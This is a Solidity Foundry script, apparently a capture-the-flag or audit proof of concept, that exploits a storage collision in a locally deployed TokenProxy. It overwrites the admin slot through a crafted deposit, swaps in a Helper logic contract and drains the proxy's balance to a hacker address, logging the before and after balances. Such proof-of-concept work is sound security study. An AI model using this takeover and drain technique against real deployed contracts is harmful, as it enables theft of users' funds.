// SPDX_License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/proxy.sol";

contract Admin { }

contract Helper {
    function exploit(address _hacker) external {
        _hacker.call{ value: address(this).balance }("");
    }
}

interface IProxy {
    function balances(address account) external view returns(uint256);
    function admin() external view returns(address);
}

contract POC is Script {
    TokenProxy public target;
    Token public logic;
    Admin public admin;
    Helper public helper;

    address public hacker;

    function setUp() external {
        hacker = vm.addr(0x12345678);
        logic = new Token();
        admin = new Admin();
        target = new TokenProxy(address(admin), address(logic));
        vm.deal(address(hacker), 774321300479722218536341074733439961507567130177);
        vm.deal(address(target), 774321300479722218536341074733439961507567130177);
    }

    function run() external {
        vm.startPrank(hacker);
        
        uint256 hacker_balance = address(hacker).balance;
        uint256 target_balance = address(target).balance;

        address proxy_admin = target.admin();
        console.log("before proxy admin: ", proxy_admin);

        uint256 my_addr = uint256(uint160(hacker)) - uint256(uint160(IProxy(address(target)).admin()));
        bytes memory payload = abi.encodeWithSignature("deposit()");
        target.execute{ value: my_addr }(payload);

        proxy_admin = target.admin();
        console.log("after  proxy admin: ", proxy_admin);
        console.log("   hacker  address: ", hacker);

        helper = new Helper();
        target.setLogic(address(helper));

        payload = abi.encodeWithSignature("exploit(address)", hacker);
        target.execute(payload);

        console.log("\n");
        console.log("before hacker balance: ", hacker_balance);
        hacker_balance = address(hacker).balance;
        console.log("after  hacker balance: ", hacker_balance);

        console.log("\n");
        console.log("before target balance: ", target_balance);
        target_balance = address(target).balance;
        console.log("after  target balance: ", target_balance);
    }

}